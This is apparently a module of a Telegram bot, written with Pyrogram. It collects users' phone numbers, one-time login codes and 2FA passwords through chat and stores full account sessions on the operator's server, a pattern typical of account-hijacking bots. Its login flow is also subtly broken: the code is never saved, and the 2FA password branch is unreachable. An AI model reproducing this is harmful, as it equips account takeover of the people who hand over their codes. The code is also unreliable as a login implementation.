from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded
from config import API_ID, API_HASH
from database import add_user

pending = {}

def setup_login(app):

    @app.on_message(filters.command("login"))
    async def login(_, m):
        pending[m.from_user.id] = {}
        await m.reply("📞 Send phone number with country code")

    @app.on_message(filters.text & filters.private)
    async def process(_, m):
        uid = m.from_user.id
        if uid not in pending:
            return

        data = pending[uid]

        client = Client(f"sessions/{uid}", API_ID, API_HASH)
        await client.connect()

        if "phone" not in data:
            data["phone"] = m.text
            sent = await client.send_code(m.text)
            data["hash"] = sent.phone_code_hash
            await m.reply("🔐 Send OTP")
            await client.disconnect()
            return

        if "otp" not in data:
            try:
                await client.sign_in(
                    phone_number=data["phone"],
                    phone_code=m.text,
                    phone_code_hash=data["hash"]
                )
            except SessionPasswordNeeded:
                data["2fa"] = True
                await m.reply("🔑 Send 2FA password")
                await client.disconnect()
                return

        elif data.get("2fa"):
            await client.check_password(m.text)

        add_user(uid)
        pending.pop(uid)
        await m.reply("✅ Login successful")
        await client.disconnect()
